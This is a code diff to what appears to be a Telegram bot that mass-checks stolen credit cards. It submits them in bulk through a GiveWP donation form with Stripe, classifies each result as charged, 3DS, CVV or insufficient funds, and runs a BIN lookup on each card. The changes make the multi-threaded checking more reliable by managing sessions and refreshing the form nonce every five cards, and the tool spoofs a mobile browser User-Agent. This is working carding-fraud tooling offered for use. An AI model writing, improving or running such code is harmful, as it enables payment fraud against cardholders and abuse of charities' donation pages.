@@ -968,17 +968,13 @@ def check_stripe_charge(cc, month, year, cvv, session=None, form_hash=None):
         
         # Step 2: Submit donation to GiveWP
         if session is None:
-            if sc_http_session is None:
-                sc_http_session = requests.Session()
-                sc_http_session.headers.update({
-                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
-                })
-            session = sc_http_session
+            session = requests.Session()
+            session.headers.update({
+                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
+            })
         
         if form_hash is None:
-            if sc_form_hash is None:
-                sc_form_hash = sc_fetch_form_nonce(session)
-            form_hash = sc_form_hash
+            form_hash = sc_fetch_form_nonce(session)
         
         don_status, don_resp, final_url = sc_submit_donation(session, pm_id, form_hash, name, email, addr)
         elapsed = round(time.time() - start_time, 2)
@@ -2589,14 +2585,14 @@ def sc_mass_command(message):
             stop_mass_flag = False
     
     def _run_sc_mass_inner(chat_id, msg_id):
-        global sc_mass_running, stop_mass_flag, sc_form_hash, sc_http_session
+        global sc_mass_running, stop_mass_flag
         
-        # Pre-fetch GiveWP form nonce for mass check
-        sc_http_session = requests.Session()
-        sc_http_session.headers.update({
+        # Create session and fetch initial nonce for mass check
+        mass_session = requests.Session()
+        mass_session.headers.update({
             'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
         })
-        sc_form_hash = sc_fetch_form_nonce(sc_http_session)
+        mass_form_hash = sc_fetch_form_nonce(mass_session)
         
         stats = {
             'charge': 0, 'threeds': 0, 'cvv': 0, 'funds': 0,
@@ -2607,6 +2603,7 @@ def sc_mass_command(message):
         last_card = "WAITING..."
         last_response = "CONNECTING..."
         last_price = "N/A"
+        cards_since_nonce = [0]  # mutable counter for nonce refresh
         
         task_queue = Queue()
         result_queue = Queue()
@@ -2618,6 +2615,7 @@ def sc_mass_command(message):
             task_queue.put(None)
         
         def sc_worker(worker_id):
+            nonlocal mass_form_hash
             while not stop_mass_flag:
                 if mass_paused:
                     time.sleep(1)
@@ -2627,6 +2625,11 @@ def sc_mass_command(message):
                     if card_str is None:
                         break
                     
+                    # Refresh nonce every 5 cards (like original script)
+                    cards_since_nonce[0] += 1
+                    if cards_since_nonce[0] > 1 and (cards_since_nonce[0] - 1) % 5 == 0:
+                        mass_form_hash = sc_fetch_form_nonce(mass_session)
+                    
                     parts = card_str.split('|')
                     if len(parts) < 4:
                         result_queue.put(('error', card_str, None, worker_id))
@@ -2634,7 +2637,7 @@ def sc_mass_command(message):
                     
                     cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
                     bin_info = bin_lookup(cc[:6])
-                    result = check_stripe_charge(cc, month, year, cvv)
+                    result = check_stripe_charge(cc, month, year, cvv, session=mass_session, form_hash=mass_form_hash)
                     result_queue.put(('success', card_str, result, worker_id, cc, month, year, cvv, bin_info))
                 except:
                     continue
